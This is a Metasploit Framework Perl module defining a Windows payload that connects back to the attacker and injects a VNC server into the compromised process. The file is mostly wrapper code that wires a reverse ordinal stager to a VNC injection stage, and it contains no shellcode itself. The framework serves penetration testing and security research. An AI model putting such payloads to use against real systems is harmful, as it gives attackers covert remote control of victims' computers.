
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_ord_vncinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectVncStage';
use FindBin qw{$RealBin};

# libinject ships over it's own resolver, and doesn't depend on the ebp
# structures like the shell stages do.  This means that all it expects is
# socket in edi, and that is the same as the ordinal stager spec.  So, no 
# adapter needed or anything, just stage and go!
sub _Load {
  Msf::PayloadComponent::Win32InjectVncStage->import('Msf::PayloadComponent::Win32ReverseOrdinalStager');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'Windows Reverse Ordinal VNC Server DLL Inject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back and inject a VNC server into the remote process',
                
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
